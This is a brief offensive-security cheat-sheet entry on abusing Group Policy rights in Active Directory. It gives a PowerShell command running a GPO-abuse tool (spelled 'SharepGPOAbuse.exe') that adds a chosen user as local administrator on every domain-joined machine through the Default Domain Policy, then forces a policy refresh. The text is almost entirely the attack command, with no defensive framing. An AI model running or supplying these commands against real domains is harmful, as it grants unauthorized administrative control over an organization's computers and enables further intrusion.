If you have the right to change the GPO, you can add your current user to be a local admin to any computer.
```powershell
.\SharepGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy" # The user will be local admin on all domain joined machines.
gpupdate /force # restart your shell
```